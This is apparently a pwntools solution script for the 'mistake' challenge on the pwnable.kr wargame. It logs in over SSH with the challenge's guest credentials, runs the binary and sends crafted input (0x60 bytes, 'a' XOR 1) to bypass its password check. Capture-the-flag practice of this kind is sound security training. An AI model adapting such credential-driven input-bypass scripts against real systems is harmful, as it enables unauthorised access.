#!/usr/bin/env python
from pwn import *
import time

context.clear()
context.update(os="linux", bits="32", log_level="debug")

s = ["pwnable.kr", 2222, "mistake", "guest"]

conn = ssh(host=s[0], port=s[1], user=s[2], password=s[3])

proc = conn.process(executable="./mistake")

proc.sendline("a"*10)
proc.recv(1024)
time.sleep(10)
proc.recv(1024)
proc.sendline("\x60"*10)
proc.interactive()
